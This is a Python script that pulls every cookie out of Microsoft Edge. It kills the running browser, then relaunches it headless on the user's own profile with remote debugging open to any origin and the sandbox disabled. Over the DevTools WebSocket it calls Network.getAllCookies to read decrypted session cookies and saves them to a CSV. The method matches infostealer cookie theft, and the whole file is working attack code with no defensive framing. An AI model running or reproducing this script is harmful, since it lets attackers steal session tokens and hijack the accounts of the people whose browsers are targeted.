import os
import subprocess
import time
import requests
import json
import websocket
import csv

# Edge ships with Windows 11 and is always in Program Files (x86) on x64 systems
_EDGE_CANDIDATES = [
    r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
    r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
]
EDGE_PATH = next((p for p in _EDGE_CANDIDATES if os.path.exists(p)), _EDGE_CANDIDATES[0])
USER_DATA_DIR = os.path.join(os.environ['LOCALAPPDATA'], r"Microsoft\Edge\User Data")


def extract_edge_cookies(user_data_dir=None):
    """
    Extracts all Edge cookies via the Chrome DevTools Protocol (CDP).
    Launches Edge headless with remote debugging, connects over WebSocket,
    and calls Network.getAllCookies to retrieve decrypted cookie values.

    Returns a list of cookie dicts on success, or an empty list on failure.
    """
    if user_data_dir is None:
        user_data_dir = USER_DATA_DIR

    print("[*] Starting Edge Cookie Extraction via CDP...")
    subprocess.run("taskkill /F /IM msedge.exe /T", shell=True, capture_output=True)
    time.sleep(2)

    cmd = (
        f'"{EDGE_PATH}" '
        f'--remote-debugging-port=9222 '
        f'--user-data-dir="{user_data_dir}" '
        f'--remote-allow-origins=* '
        f'--headless '
        f'--disable-gpu '
        f'--no-sandbox'
    )
    subprocess.Popen(cmd, shell=True)
    time.sleep(5)

    try:
        response = requests.get("http://localhost:9222/json", timeout=10)
        targets = response.json()
        if not targets:
            print("[-] No CDP targets found. Is Edge running?")
            return []
        ws_url = targets[0]['webSocketDebuggerUrl']

        ws = websocket.create_connection(ws_url, timeout=10)
        ws.send(json.dumps({"id": 1, "method": "Network.getAllCookies"}))
        result = json.loads(ws.recv())
        cookies = result.get('result', {}).get('cookies', [])
        ws.close()

        print(f"[+] Extracted {len(cookies)} Edge cookies.")
        return cookies

    except Exception as e:
        print(f"[-] CDP Error: {e}")
        return []

    finally:
        subprocess.run("taskkill /F /IM msedge.exe /T", shell=True, capture_output=True)


def save_cookies_report(data, out_file="edge_cookies_report.csv"):
    """Saves extracted cookie list to a CSV report file."""
    if not data:
        print("[-] No cookie data to save.")
        return
    with open(out_file, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=data[0].keys(), extrasaction='ignore')
        writer.writeheader()
        writer.writerows(data)
    print(f"[+] {len(data)} cookies saved to {out_file}")


if __name__ == "__main__":
    cookie_data = extract_edge_cookies()
    save_cookies_report(cookie_data)
